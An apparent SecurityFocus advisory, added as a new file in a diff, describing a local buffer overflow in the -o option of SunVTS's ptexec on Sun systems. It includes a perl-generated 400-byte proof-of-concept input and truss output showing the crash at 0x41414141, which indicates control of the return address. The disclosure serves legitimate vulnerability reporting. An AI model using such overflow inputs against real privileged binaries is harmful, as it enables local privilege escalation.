@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/2898/info
+
+SunVTS is the Sun Validation Test Suite, distributed and maintained by Sun Microsystems. The SunVTS is used to test various components of OEM Sun hardware, and can also be used to stress-test components and sub-components.
+
+A buffer overflow in the -o of the ptexec command exists. It is possible for a local user to overwrite stack memory, including the return address.
+
+This makes it possible for a local user to gain elevated privileges, and potentially full administrative access. 
+
+# > .sunvts_sec_gss
+# /opt/SUNWvts/bin/ptexec -o `perl -e 'print "A"x400'`
+Segmentation Fault (core dumped)
+
+# truss /opt/SUNWvts/bin/ptexec -o `perl -e 'print "A"x400'`
+
+execve("/opt/SUNWvts/bin/ptexec", 0xFFBEFA44, 0xFFBEFA54) argc = 3
+stat("/opt/SUNWvts/bin/ptexec", 0xFFBEF780) = 0
+open("/var/ld/ld.config", O_RDONLY) Err#2 ENOENT
+open("/usr/lib/librpcsvc.so.1", O_RDONLY) = 3
+fstat(3, 0xFFBEF518) = 0
+mmap(0x00000000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0xFF3A0000
+
+[.....]
+
+sigprocmask(SIG_SETMASK, 0xFF23F010, 0x00000000) = 0
+sigaction(SIGSEGV, 0xFFBEE388, 0x00000000) = 0
+sigprocmask(SIG_SETMASK, 0xFF24ADE0, 0x00000000) = 0
+setcontext(0xFFBEE248)
+Incurred fault #6, FLTBOUNDS %pc = 0xFF139FF0
+siginfo: SIGSEGV SEGV_MAPERR addr=0x41414141
+Received signal #11, SIGSEGV [default]
+siginfo: SIGSEGV SEGV_MAPERR addr=0x41414141
+*** process killed *** 
